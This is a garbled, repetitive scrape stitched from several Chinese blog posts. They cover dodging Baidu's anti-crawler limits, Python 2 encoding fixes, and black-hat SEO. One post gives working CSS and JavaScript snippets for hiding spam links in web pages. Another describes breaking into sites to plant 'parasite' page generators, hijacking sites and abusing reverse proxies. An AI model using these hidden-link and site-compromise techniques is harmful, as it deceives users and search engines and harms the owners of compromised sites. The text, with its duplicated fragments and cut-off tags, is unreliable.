cookies影响搜索结果\n在几次爬取过程中，我无意发现在headers中加不加cookies会影响最终的搜索结果（主要影响搜索结果的多少）。\n\n\n*以上几点严格意义上来说，并不算反爬虫技术，只是一种保护自身资源的方式，其意不言而喻*\n\n\n### Baidu_link问题\n　　通过获取百度搜索结果源码，以及通过正则匹配，我们能够得到一些搜索结果链接，然后这些链接并不是网站原链接，有以下2种形式：\n```bash\nhttp://www.baidu.com/link?url=1qIAIIh_2N7LUQpI0AARembLK2en4QpGjaRqKZ3BxYtzoZYevC5jA2jq6XMwgEKF&wd=&eqid=9581fbec0007eae00000000458200ad4\n\nhttp://www.baidu.com/link?url=1qIAIIh_2N7LUQpI0AARembLK2en4QpGjaRqKZ3BxYtzoZYevC5jA2jq6XMwgEKF\n```\n　　我暂且称它为\"百度链接\"，其基本就是以上2种形式。第一种是通过点击右键复制链接地址获取到的，通常带有eqid参数，用来表示referer；第二种是通过页面源代码获取到的，这种是不带wd与eqid参数的。而eqid参数的值在每次刷新页面后，都会改变，这可能是百度限制黑帽SEO所设置的一个参数。\n　　那么我们比较两者之差异，当我们分别取访问这2条连接时，返回的数据包是不一样的。\n\n#### 带eqid参数\n第一种带eqid参数的会返回200，在body里面会有网站真实的链接，可以通过正则匹配：\n```bash\nres_baidu=r\"window\\.location\\.replace\\(\\\"([^\\\"]*)\\\"\\)\"\n```\n#### 不带eqid参数\n第二种不带参数的会返回一个302跳转，并且在header会有location字段，可以通过requests模块（head模式）去访问获取。\n\n#### 解析baidu_link模块\n```bash\n#! -*- coding:utf-8

不带eqid参数\n第二种不带参数的会返回一个302跳转，并且在header会有location字段，可以通过requests模块（head模式）去访问获取。\n\n#### 解析baidu_link模块\n```bash\n#! -*- coding:utf-8

class=\"blockquote-center\">与天斗，其乐无穷；与地斗，其乐无穷</blockquote><br>　　自从Google退出中国市场，Baidu就成了国内搜索引擎巨头，所谓树大招风，一直以来百度成为国内众多黑客攻击的对象。又因为其本身作为一款搜索引擎，拥有很多的网络资源，因此借助baidu来获取海量数据，成为了一种便捷有效的信息收集途径。虽然baidu在爬虫算法上没有google那么优秀，但对中文搜索的支持并不会很差（小小吐槽一番百度），然而在通过百度爬取数据时，我们往往会遇到百度自身的反爬虫措施，如何解决这些反爬虫措施，将会是本文的重点。<br><a

class=\"blockquote-center\">与天斗，其乐无穷；与地斗，其乐无穷</blockquote><br>　　自从Google退出中国市场，Baidu就成了国内搜索引擎巨头，所谓树大招风，一直以来百度成为国内众多黑客攻击的对象。又因为其本身作为一款搜索引擎，拥有很多的网络资源，因此借助baidu来获取海量数据，成为了一种便捷有效的信息收集途径。虽然baidu在爬虫算法上没有google那么优秀，但对中文搜索的支持并不会很差（小小吐槽一番百度），然而在通过百度爬取数据时，我们往往会遇到百度自身的反爬虫措施，如何解决这些反爬虫措施，将会是本文的重点。<br>","more":"<br>　　关于反爬虫的技术，网上有很多资源，方法不外乎（代理、识别验证码、分布式架构、模拟浏览器、ADSL切换ip等），这些不是本文的重点，本文只针对爬取百度搜索引擎时遇到的反爬虫措施，以及一些解决方案。</p>\n<h3

title=\"常规解决方案\"></a>常规解决方案</h3><p>　　基于百度反爬虫的特点，我们可以通过分布式部署爬虫服务器，来采集资源，当然个人觉得ADSL服务器效果会更佳。但是分布式部署，尤其是ADSL服务器部署，成本会变得非常高，而且需要维护。那么有没有只用一台服务器就可以解决被屏蔽的问题呢？<br>　　答案是肯定，那就是单机+多线程+ip代理，这种方式比较实惠，但比较考验ip代理的稳定性。经个人测试，感觉国内绝大部分代理（收费、免费、动态等）都不是很稳定，因此这是一种折中的方式，那么有没有更好的方式呢？</p>\n<h3 id=\"另类解决方案\"><a href=\"#另类解决方案\" class=\"headerlink\" title=\"另类解决方案\"></a>另类解决方案</h3><p>　　作为一家搜索引擎公司，百度的爬虫一定是分布式部署；又因为百度在国内的占有率很高，因此其提供搜索服务的服务器也应当是分布式部署的，也就是说全国各地部署了很多百度的服务器。<br>　　那么当我们打开浏览器，访问百度时，提供搜索服务的服务器往往是离我们最近的那台，因此可以想见屏蔽我们的也就是那台服务器。大胆想象一下，如果我们能自由切换去访问不同地区的百度服务器，那么是否可以绕过被单一服务器屏蔽的问题呢？</p>\n<p>当然这一解决方案的前提是：</p>\n<ul>\n<li>我们必须拥有大量的百度服务器的ip地址</li>\n<li>百度允许用ip地址访问（实在不行就更改host）</li>\n</ul>\n<p>　　可喜的是，以上2点都不难办到。网上有百度服务器的资源可以获取，当然也可以通过在不同地区的服务器ping百度获取ip；至于直接通过ip地址访问百度，这默认便是可行的（不知道百度为何这样设置）</p>\n<h3 id=\"百度的大招\"><a href=\"#百度的大招\" class=\"headerlink\" title=\"百度的大招\"></a>百度的大招</h3><p>c通过以上几种方式，应该可以绕过百度的反爬虫机制，但是百度也不是吃素的，它也有自己独特的反爬虫杀招，或许称之为”搜索限制”或者是”资源保护”措施更合适一点。</p>\n<h4 id=\"搜索结果数设上限\"><a

class=\"blockquote-center\">技术的探索，就好像编织故事一般，其乐趣在于偶尔能够讲述给别人听，并获得一些赞同！</blockquote>\nPython编码问题一直困扰了我许久，之前有过一些总结，但并不系统，比较凌乱。当然python2.x编码问题本身，便是剪不断理还乱。本篇将系统介绍python2.x编程中会遇到的一些编码问题，并给出解决方案。基于对编码问题的摸索了解，我也尝试写了一个编码转换模块[Transcode](https://github.com/tengzhangchao/Transcode)，应该能解决绝大部分新手的疑难杂症。当然，python大神可以绕道而行，至于使用3.x的朋友，以后将会成文介绍。\n<!--more -->\n　　python编程中会经常遇到操作系统编码、文件编码、控制台输入输出编码、网页编码、源代码编码、python编码，本文将会逐一介绍。首先我们来看看一些常见的编码情况：\n```bash\nprint sys.getdefaultencoding()    #系统默认编码\nprint sys.getfilesystemencoding() #文件系统编码\nprint locale.getdefaultlocale()   #系统当前编码\nprint sys.stdin.encoding          #终端输入编码\nprint sys.stdout.encoding         #终端输出编码\n```\n将以上这段代码在windows与linux系统下分别运行，查看输出结果。\nwindows终端结果:\n```bash\nascii\nmbcs\n('zh_CN', 'cp936')\ncp936\ncp936\n```\nLinux终端结果：\n```bash\nascii\nUTF-8\n('zh_CN', 'UTF-8')\nUTF-8\nUTF-8\n```\n### 操作系统编码\n　　操作系统默认编码可以通过sys.getdefaultencoding()函数获取，可以看到windows与linux下默认都为ascii编码，而我们知道ascii编码不支持中文。那么操作系统编码将在python程序的何处会被用到呢？何时又会引发血案？\n\n#### 触发异常点\n　　经过测试，我发现当需要将unicode格式的字符串存入到文件时，python内部会默认将其先转换为Str格式的系统编码，然后再执行存入步骤。而在这过程中，容易引发ascii异常。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\na=u\"中文\"\nf=open(\"test.txt\",\"w\")\nf.write(a)\n```\n报错异常信息：UnicodeEncodeError: 'ascii' codec can't encode characters in position 0-1......\n说明：因为ascii不支持中文，而变量a为unicode格式的中文字符串，因此无法进行编码而引发异常。\n\n#### 解决方案\n设置系统编码为utf-8或者gbk。\n```bash\nimport sys\nreload(sys)\nsys.setdefaultencoding('gbk')\n```\n说明：在windows下将其设置为gbk，在linux在设置为utf-8.\n\n### 终端编码\n　　windows下终端指的是控制台，在控制台上输入输出有着其本身的编码格式，如windows控制台输入输出编码都为cp936。原谅我是第一次看到此编码，于是上网查了会，发现其实它就是常见的GBK编码；而linux终端的输入输出编码都为utf-8。如果我们编写的程序，不会再终端输入输出任何内容，则可以忽略此编码，如若不然终端编码将会非常重要。\n\n#### 乱码点\n我们在终端执行python脚本时，经常会遇到输出中文乱码，而这往往是因为输出的字符串本身编码与控制台编码不一致。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\na=\"中文\"  #定义一个变量，默认为Str，utf-8编码\nprint a\nprint type(a)\n```\nwindows控制台输出结果：\n```bash\n浣犲ソ\n<type 'str'>\n```\nlinux终端输出结果：\n```bash\n中文\n<type 'str'>\n```\n造成这种差异的原因在于windows控制台为gbk编码，而变量a本身为utf-8编码。\n\n#### 解决方案\n```bash\n#! -*- coding:utf-8 -*-\na='你好'\nb=a.decode(\"utf-8\").encode(\"gbk\")\nprint b\n```\n将变量a从utf-8编码转换为gbk编码。\n\n### python编码\n　　python2.x从外部获取的内容都是string编码，其内部分为String编码与Unicode编码，而String编码又分为UTF-8，GBK，GB2312等等。因此为了避免不同编码造成的报错，python内部最好都转化为unicode编码，在输出时再转化为str编码 。可以用encode()/decode()函数，将string与unicode编码互换。\n\n#### 触发异常点\n基本在于python内部变量编码与控制台编码，或者其他编码相结合时触发。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\na=\"中文\"  #定义一个变量，默认为str，utf-8编码\nprint a\nprint type(a)\n```\n运行结果：\n```bash\n浣犲ソ\n<type 'str'>\n```\n　　说明：windows下控制台输入输出都是gbk编码格式，而代码中定义的变量a为str，utf-8格式，所以会出现乱码。如果想创建一个unicode编码字符串的变量，则可以a=u\"123\"，在双引号前面加上一个u，表示a为unicode编码。\n\n#### 解决方案\n```bash\n#! -*- coding:utf-8 -*-\na='你好'\nprint a.decode(\"utf-8\").encode(\"gbk\")\n```\n　　说明：首先我们定义的变量a是str格式，编码为utf-8的字符串，我们要将之转化为str格式，GBK编码的字符串。在python内部无法直接转化，需要借助decode()与encode()函数。decode()函数先将str格式的字符串a转化为unicode，再将unicode编码为str格式GBK。而在Unix系统下，不存在这个问题，因为都是utf-8编码，不会存在乱码。print语句默认会将unicode编码的字符串，encode为相应系统的str编码并输出（windows下为gbk,unix下为utf-8）,因此不用担心print unicode编码字符串会报错。\n\n### 源代码编码\n源代码编码指的是python程序本身的编码，默认为ascii。\n\n#### 触发异常点\n　　python程序本身要被解释器解析执行，需要先被转化为二进制代码。而在这过程中容易引发异常，原因同样是ascii不支持中文，因此当python程序中出现中文时，哪怕是注释，也会引发ascii异常。\n实例证明：\n```bash\nprint \"中文\"  #中文注释\n```\n报错：SyntaxError: Non-ASCII character '\\xe7'......\n\n#### 解决方案\n```bash\n#! -*- coding:utf-8 -*-\n```\npython程序开头加上这句代码，指定python源代码编码格式为utf-8。\n\n### 文件编码\n　　文件编码指的是，python程序从文件中获取的内容的编码格式。可以用sys.getfilesystemencoding()函数获取，windows下为mbcs，linux下为utf-8。至于mbcs，是一种多字节编码（没搞很明白）。\n\n#### 触发异常点（读取文件内容）\n当python程序从文件中获取内容，并输出时，容易触发异常。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\nf=open(\"test.txt\",\"r\")\ncontent=f.read()\nprint type(content)\nprint content\n```\n运行结果：\n```bash\n<type 'str'>\n你好\n```\n　　可以看到windows下，从文件中读取的编码格式为Str，GBK格式（因为控制台输出没有中文乱码）；而在Unix下为Str，Utf-8格式。从输出内容来说，并没有触发异常，然而当这些内容与python程序自身内容相结合时，容易触发异常。\n\n#### 解决方案\n在windows下，最好将文件内容转为unicode，可以使用codecs：\n```bash\nf=codecs.open(\"test.txt\", encoding='gbk').read()\n```\n将格式为gbk的文件内容转化为unicode格式，当然也可以直接使用open(\"\",\"r\").read().decode(\"gbk\")\n\n#### 触发异常点（写入文件内容）\n参考操作系统编码触发异常点，即将中文unicode字符写入文件时，容易触发异常。\n\n#### 解决方案\n参考操作系统编码解决方案，或者手动将unicode编码转换为str编码。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\na=u\"中文\"  #a为unicode格式编码\nf=open(\"test.txt\",\"w\")\nf.write(a.encode(\"gbk\"))\n```\n当然如果变量a本身就是Str则不会报错，只是utf-8编码的内容写入windows文件中，显示会乱码。\n\n### 网页编码\n　　网页编码，通常在写爬虫的时候经常遇到，再结合系统编码，python编码，文件编码，往往会搞得一团乱。在程序中我们应该分别处理这些编码，在python内部全部转化为unicode。那么网页编码又有哪些格式呢？\n常见格式：utf-8，gbk，gb2312\n#### 触发异常点\n还是在于从网页中获取的源码编码与终端编码，甚至python内部编码不一致的情况。\n实例证明：\n```bash\n#!coding=utf-8\nimport urllib2\nbody=urllib2.urlopen('http://thief.one').read()\nprint type(body)\nprint body\n```\n运行结果：\n```bash\n<type 'str'>\nbody中文显示乱码\n```\n说明：这个网站的编码是utf-8，而且python从网页上爬取的内容都为Str格式，在windows控制台下输出会乱码。\n\n#### 解决方案\n　　依照之前做法，先将其转化为unicode。而相应的正则也可以为unicode编码，如：res=r''+u\"新成员\"。可以通过chardet模块判断网页编码类型，返回的是一个带概率的字典。\n\n### 编码判断\n#### 判断字符串编码\n```bash\nisinstance(obj, (str, unicode))\n```\n返回True或者False\n#### 判断网页编码\n```bash\nimport chardet\nimport urllib2\nbody=urllib2.urlopen(\"http://thief.one\").read()\nchardet.detect(body)\n```\n判断编码格式，会有百分比，一般用来判断网页编码比较好。\n\n#### 判断系统编码\n```bash\nprint sys.getdefaultencoding()    #系统默认编码\nprint sys.getfilesystemencoding() #文件系统编码\nprint locale.getdefaultlocale()   #系统当前编码\nprint sys.stdin.encoding          #终端输入编码\nprint sys.stdout.encoding         #终端输出编码\n```\n### python2.x编码建议\n\n* 请尽量在Linux系统上编程，综上我们可以知道linux下较windows，编码问题良好很多。\n* python代码内部请全部使用unicode编码，在获取外部内容时，先decode为unicode，向外输出时再encode为Str\n* 在定义变量或者正则时，也定义unicode字符，如a=u\"中文\"；res=r\"\"+u\"正则\"。\n\n### 其他疑难杂症\n实例一：\n```bash\na=\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\"\nprint a\n```\n变量a的内容本身为unicode编码，怎么正常显示输入？\n解决方案：\n```bash\na=\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\" # unicode转化为中文\nb=a.decode('unicode-escape')\nprint b\n```\n<hr>\n　　如果阅读完本章，增加了您对python编码问题的认识，那我会感到欣慰，如有python编码上的问题可以在下方留言。\n　　如果阅读完本章，您仍然不知如何解决python乱码问题，没关系，请继续移步阅读[Transcode解决python编码问题](https://github.com/tengzhangchao/Transcode)\n\n*　　为了能够让您重视，我不得不再次重申：解决python2.x编码问题的关键，在于要明白无论从哪里来的内容，在python内部流通时，都应该先转换为unicode。（python3.x在这方面做了改进，并取得了很好的效果）*\n\n\n###

触发异常点（写入文件内容）\n参考操作系统编码触发异常点，即将中文unicode字符写入文件时，容易触发异常。\n\n#### 解决方案\n参考操作系统编码解决方案，或者手动将unicode编码转换为str编码。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\na=u\"中文\"  #a为unicode格式编码\nf=open(\"test.txt\",\"w\")\nf.write(a.encode(\"gbk\"))\n```\n当然如果变量a本身就是Str则不会报错，只是utf-8编码的内容写入windows文件中，显示会乱码。\n\n### 网页编码\n　　网页编码，通常在写爬虫的时候经常遇到，再结合系统编码，python编码，文件编码，往往会搞得一团乱。在程序中我们应该分别处理这些编码，在python内部全部转化为unicode。那么网页编码又有哪些格式呢？\n常见格式：utf-8，gbk，gb2312\n#### 触发异常点\n还是在于从网页中获取的源码编码与终端编码，甚至python内部编码不一致的情况。\n实例证明：\n```bash\n#!coding=utf-8\nimport urllib2\nbody=urllib2.urlopen('http://thief.one').read()\nprint type(body)\nprint body\n```\n运行结果：\n```bash\n<type 'str'>\nbody中文显示乱码\n```\n说明：这个网站的编码是utf-8，而且python从网页上爬取的内容都为Str格式，在windows控制台下输出会乱码。\n\n#### 解决方案\n　　依照之前做法，先将其转化为unicode。而相应的正则也可以为unicode编码，如：res=r''+u\"新成员\"。可以通过chardet模块判断网页编码类型，返回的是一个带概率的字典。\n\n### 编码判断\n#### 判断字符串编码\n```bash\nisinstance(obj, (str, unicode))\n```\n返回True或者False\n#### 判断网页编码\n```bash\nimport chardet\nimport urllib2\nbody=urllib2.urlopen(\"http://thief.one\").read()\nchardet.detect(body)\n```\n判断编码格式，会有百分比，一般用来判断网页编码比较好。\n\n#### 判断系统编码\n```bash\nprint sys.getdefaultencoding()    #系统默认编码\nprint sys.getfilesystemencoding() #文件系统编码\nprint locale.getdefaultlocale()   #系统当前编码\nprint sys.stdin.encoding          #终端输入编码\nprint sys.stdout.encoding         #终端输出编码\n```\n### python2.x编码建议\n\n* 请尽量在Linux系统上编程，综上我们可以知道linux下较windows，编码问题良好很多。\n* python代码内部请全部使用unicode编码，在获取外部内容时，先decode为unicode，向外输出时再encode为Str\n* 在定义变量或者正则时，也定义unicode字符，如a=u\"中文\"；res=r\"\"+u\"正则\"。\n\n### 其他疑难杂症\n实例一：\n```bash\na=\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\"\nprint a\n```\n变量a的内容本身为unicode编码，怎么正常显示输入？\n解决方案：\n```bash\na=\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\" # unicode转化为中文\nb=a.decode('unicode-escape')\nprint b\n```\n<hr>\n　　如果阅读完本章，增加了您对python编码问题的认识，那我会感到欣慰，如有python编码上的问题可以在下方留言。\n　　如果阅读完本章，您仍然不知如何解决python乱码问题，没关系，请继续移步阅读[Transcode解决python编码问题](https://github.com/tengzhangchao/Transcode)\n\n*　　为了能够让您重视，我不得不再次重申：解决python2.x编码问题的关键，在于要明白无论从哪里来的内容，在python内部流通时，都应该先转换为unicode。（python3.x在这方面做了改进，并取得了很好的效果）*\n\n\n###

title=\"终端编码\"></a>终端编码</h3><p>　　windows下终端指的是控制台，在控制台上输入输出有着其本身的编码格式，如windows控制台输入输出编码都为cp936。原谅我是第一次看到此编码，于是上网查了会，发现其实它就是常见的GBK编码；而linux终端的输入输出编码都为utf-8。如果我们编写的程序，不会再终端输入输出任何内容，则可以忽略此编码，如若不然终端编码将会非常重要。</p>\n<h4 id=\"乱码点\"><a href=\"#乱码点\" class=\"headerlink\" title=\"乱码点\"></a>乱码点</h4><p>我们在终端执行python脚本时，经常会遇到输出中文乱码，而这往往是因为输出的字符串本身编码与控制台编码不一致。<br>实例证明：<br><figure class=\"highlight bash\"><table><tr><td

title=\"python编码\"></a>python编码</h3><p>　　python2.x从外部获取的内容都是string编码，其内部分为String编码与Unicode编码，而String编码又分为UTF-8，GBK，GB2312等等。因此为了避免不同编码造成的报错，python内部最好都转化为unicode编码，在输出时再转化为str编码 。可以用encode()/decode()函数，将string与unicode编码互换。</p>\n<h4 id=\"触发异常点-1\"><a href=\"#触发异常点-1\" class=\"headerlink\" title=\"触发异常点\"></a>触发异常点</h4><p>基本在于python内部变量编码与控制台编码，或者其他编码相结合时触发。<br>实例证明：<br><figure

unicode编码字符串会报错。</p>\n<h3 id=\"源代码编码\"><a href=\"#源代码编码\" class=\"headerlink\" title=\"源代码编码\"></a>源代码编码</h3><p>源代码编码指的是python程序本身的编码，默认为ascii。</p>\n<h4 id=\"触发异常点-2\"><a href=\"#触发异常点-2\" class=\"headerlink\" title=\"触发异常点\"></a>触发异常点</h4><p>　　python程序本身要被解释器解析执行，需要先被转化为二进制代码。而在这过程中容易引发异常，原因同样是ascii不支持中文，因此当python程序中出现中文时，哪怕是注释，也会引发ascii异常。<br>实例证明：<br><figure class=\"highlight

。可以用encode()/decode()函数，将string与unicode编码互换。</p>\n<h4 id=\"触发异常点-1\"><a href=\"#触发异常点-1\" class=\"headerlink\" title=\"触发异常点\"></a>触发异常点</h4><p>基本在于python内部变量编码与控制台编码，或者其他编码相结合时触发。<br>实例证明：<br><figure

unicode编码字符串会报错。</p>\n<h3 id=\"源代码编码\"><a href=\"#源代码编码\" class=\"headerlink\" title=\"源代码编码\"></a>源代码编码</h3><p>源代码编码指的是python程序本身的编码，默认为ascii。</p>\n<h4 id=\"触发异常点-2\"><a href=\"#触发异常点-2\"

display属性\n将display属性设置为none，则页面上不显示此内容。\n```bash\n<div style=\"display:none;\">\n<a href=http://thief.one/ >暗链</a>\n</div>\n```\n分析：这种形式以前效果较好，现在不建议使用，易被搜索引擎察觉。\n\n#### color/font-size/line-height属性\n将color颜色设置与页面背景色一样，大小设置为小于或等于1。\n```bash\n<a href=http://thief.one style=\"color:#FFFFFF;font-size:1px;line-height:1px ;\">暗链</a>\n```\n分析：最初级的隐蔽链接，易被搜索引擎察觉。\n\n#### position属性\n将position位置属性设置成负数，使内容位于页面可见范围以外。\n```bash\n<div style=\"position: absolute; top: -999px;left: -999px;\"><a href=http://thief.one >暗链</a></div>\n```\n```bash\n<div style=\"position:absolute;left:expression_r(1-900);top:expression_r(3-999);\"><a href=http://thief.one >暗链</a></div>\n```\n分析：以上2种写法，都是将内容放到可见范围以外，容易被搜索引擎识别。\n\n#### marquee属性\n设置marquee滚动标签属性，使之快速闪现。\n```bash\n<marquee height=1 width=5 scrollamount=3000 scrolldelay=20000><a href=http://thief.one >暗链</a></marquee>\n```\n分析：链接以赛马灯形式迅速闪现，这种形式以前效果较好，现在不建议使用。\n\n### 利用JS实现挂暗链\n利用js向页面中写入css代码，设置属性。\n```bash\n<script language=\"javascript\" type=\"text/javascript\">\ndocument.write(\"<div style='display:none;'>\");\n</script><div>\n\n<a href=http://thief.one>暗链</a>\n\n<script language=\"javascript\" type=\"text/javascript\">\ndocument.write(\"</div>\");\n</script>\n```\n分析：js输出前面提到的css代码，到达一样的效果。目前来说Google对这种js形式的代码的内部实质意义还无法识别，但也不建议使用这种。\n\n### 利用DIV+JS实现挂暗链\n利用div与js功能，修改属性。\n```bash\n<div id=\"anlian\"><a href=\"http://thief.one\">暗链</a></div>\n<script language=javascript>\ndocument.getElementById(\"anlian\").style.display=\"none\"\n</script>\n```\n分析：这是一种DIV与JS结合做黑链的一种常见方法，蜘蛛一般不会读取script的内容，只会读取div里的链接，可是div的显示属性却被script修改了。\n\n### 挂暗链高级姿势\n```bash\n<div class=\"father\" style=\"position:relative\">\n　　<div class=\"topLever\" style=\"position:absolute;left:0;top:0;z-index:999; width:90%;height:100px;border:1px solid #333;background:#eee\">遮挡层：可以放图片或者Flash</div>\n　　<div class=\"hideDontent\">隐蔽层：可以放暗链链接</div>\n</div>\n```\n分析：这种方式一般是放在Flash、图片或者其它层对象下方。这个代码是用父层相对定位，子层用绝对定位固定住以用来遮挡下面的隐蔽层内的暗链内容。\n\n\n结语：*暗链不是什么新鲜的技术，但黑帽SEO始终在摸索前行，路漫漫其修远兮！*\n\n###

白帽与黑帽的优缺点显而易见，换句话说两者皆不完美，因此便又诞生了灰帽SEO，介于两者之间，既不违规，又可以较快速的提升排名。由于项目需要，最近开始接触一些黑帽SEO的知识，在此总结分享，欢迎指正！\n\n### 黑帽SEO基础概念\n\n#### 域名\n概念：域名由两个或两个以上的词构成，中间由点号分隔开，最右边的那个词称为顶级域名。\n>##### 顶级域名\n我们接触的顶级域名又分为两类：\n1.国家和地区顶级域名，目前200多个国家分配了顶级域名，例如中国是cn，日本是jp等；\n2.国际顶级域名，例如表示工商企业的.com，表示网络提供商的.net，表示非盈利组织的.org等。\n##### 一级域名\n一级域名就是在com net org前加一级，比如：baidu.com，thief.one等。\n##### 二级域名\nnews.baidu.com，tieba.baidu.com等都是二级域名。\n\n#### 泛站群\n##### 泛二级域名站群\n![](/upload_image/20161009/2.png)\n前提：在做域名解析的时候，选择了*\n操作：进入服务器，可以借助泛二级域名建站工具，批量创建二级域名站点，从而实现站群的效果。\n##### 泛端口站群\n![](/upload_image/20161009/1.png)\n操作：先要获得操作目标站点的服务器权限，进入服务器之后，可以使用泛端口站群建设工具，批量创建泛端口站点。主要是在iis里面批量创建站点，绑定站点对应的端口。对于泛端口站点，一定要注意一些重要端口别占用了，否则可以导致服务器出错。一般泛站，用的比较多的是Dedecms程序。\n#### 站中站\n　 就是在权重高的网站中创建一个自己的网站，其实就是添加很多外链，蜘蛛会认为这些网站也是属于高权重网站的内容，因此权重也会比较高。但是由于这种做法太泛滥，导致百度修改了爬虫算法。\n#### 链轮\n![](/upload_image/20161009/3.png)\n　 Y是想要推广的网站，W是自己控制的外部网站，首先可以搞多个网站，一层层外链下去，形成链轮。当想要推广某个网站时，可以在所有外部网站上添加Y的外链。谷歌貌已经对此不友好，百度还可以尝试。\n#### 蜘蛛池\n　 蜘蛛池是一种通过利用大型平台权重来获得搜索引擎收录以及排名的一种程序。原理可以理解为事先创建了一些站群，获取（豢养）了大量搜索引擎蜘蛛。当想要推广一个新的站点时，只需要将该站点以外链的形式添加到站群中，就能吸引蜘蛛爬取收录。\n#### 寄生虫\n　 寄生虫是黑帽SEO常用的一种方法，通过侵入别人网站，植入寄生虫程序，自动生成各种非法页面。之所以叫做寄生虫是因为能够自己触发生成，而不是一次生成，例如在访问网页的时候触发，自动生成页面且形成链轮等。\n<hr>\n### 黑帽SEO作弊手法\nSEO作弊手法不仅仅是为了提升网站排名，也有可能是为了陷害对手网站，降低其排名。\n#### PR劫持\n　 往往是利用301或者302跳转，因为搜索引擎在处理301，302跳转时，把目标URL当做实际收录的URL。\n　 即当从A域名302到B域名，而B域名的PR值比较高时，域名A在更新PR值后，也会显示域名B的PR值，也就是说可以提升A的PR值。利用这一点，可以先将自己网站302跳转到一个PR高的网站，等PR值更新后，取消转向，放上自己的内容，这样可以维持到下一次PR值更新，大概两三个月的时间。\n#### 网站跳转\n详细参考：[黑帽SEO之页面跳转](http://thief.one/2016/10/10/%E9%BB%91%E5%B8%BDSEO%E2%80%94%E2%80%94%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/)\n#### 隐藏页面\n　 隐藏页面指的是页面使用程序判断访问者是普通用户还是搜索引擎蜘蛛。如果是普通用户，程序返回一个不考虑SEO，只给用户看的页面；如果是搜索引擎蜘蛛，程序就返回一个高度优化的，但是由于优化后无法阅读的页面。\n#### 隐藏文字\n　 隐藏文字指的是网页上用户看不到，但搜索引擎能看到的文字，可以通过改变文字颜色，位置，大小等方式，代码：\n```bash\n<div style=\"display:none\">隐藏文字</div>\npositon:absolute;\nmargin-right:-1000000px;\n```\n#### 垃圾连接\n　 垃圾连接通常指站长为了提高网站排名，去各大论坛网站留言，留下自己的连接，一般通过群发软件完成这一操作。这种手法，容易被过滤掉，一些浏览器的插件或者博客的插件可以自动进行垃圾留言过滤。\n#### 连接农场\n　 链接农场指的是整个网站或者部分网页，没有实质内容，完全是为了交换链接而存在。该页面上全部是链接到其他网站，其他网站再链回来，互相交叉。\n#### 桥页\n　 桥页也称为“门页”，此页面质量很低，充斥着关键字，完全以关键词排名与流量为目标，不考虑用户体验。当用户访问桥页，一般会有两种情况。\n* 页面顶部以大字号连接到其他网站（想要推广的网站），用户因为看不清桥页内容，有时不得不点击连接。\n* 利用页面自动跳转技术。\n\n#### 关键词堆积\n关键词堆积指的是在页面上本来没必要出现关键词的地方反复刻意堆积关键词，提高排名。\n#### 诱饵替换\n诱饵替换指的是作弊者先通过普通关键词制作页面获得排名后，更改为其他内容。\n#### 刷站\n刷站是一种利用程序模拟用户用搜索引擎，搜索某个关键词，然后点击浏览某个网页的行为。\n#### 挂暗链（黑链）\n手法：利用CSS，利用DIV+JS，利用JS等\n作用：利用高权重网站外链来提升自身站点排名。\n详细参考：[黑帽SEO之暗链](http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E6%9A%97%E9%93%BE/)\n#### 网站劫持\n分类：客户端劫持，服务端劫持，快照劫持等\n手法：一般利用js或者php、asp等代码，达到劫持网站，控制跳转以及网页效果呈现的目的。\n作用：利用高权重网站跳转来引流量。\n详细参考：[黑帽SEO之网页劫持](http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/)\n#### 利用高权重网站二级目录\n手法：将一些博彩网页放在高权重网站的二级目录之下。\n作用：提高网站排名，引流量。\n#### 利用高权重网站二级目录反向代理\n　 通过配置nginx/apache等，设置目录代理，将服务器上某个目录代理到自己搭建服务器上的某个目录。\n　 即浏览者在打开*http://thief.one/2016/*目录时，实际访问到的资源是自己服务器上的某个目录（目标服务器会去自己服务器上拿数据），这取决于nginx配置文件的写法。这种手法不需要修改目标服务器网站源码，只需要修改中间件配置文件，不易被删除，不易被发现。\n\n*持续更新.......*\n\n参考：黑帽SEO论坛、SEO实战密码\n\n###

href=\"#顶级域名\" class=\"headerlink\" title=\"顶级域名\"></a>顶级域名</h5><p>我们接触的顶级域名又分为两类：<br>1.国家和地区顶级域名，目前200多个国家分配了顶级域名，例如中国是cn，日本是jp等；<br>2.国际顶级域名，例如表示工商企业的.com，表示网络提供商的.net，表示非盈利组织的.org等。</p>\n<h5 id=\"一级域名\"><a href=\"#一级域名\" class=\"headerlink\" title=\"一级域名\"></a>一级域名</h5><p>一级域名就是在com net org前加一级，比如：baidu.com，thief.one等。</p>\n<h5 id=\"二级域名\"><a href=\"#二级域名\" class=\"headerlink\" title=\"二级域名\"></a>二级域名</h5><p>news.baidu.com，tieba.baidu.com等都是二级域名。</p>\n</blockquote>\n<h4 id=\"泛站群\"><a href=\"#泛站群\" class=\"headerlink\" title=\"泛站群\"></a>泛站群</h4><h5 id=\"泛二级域名站群\"><a

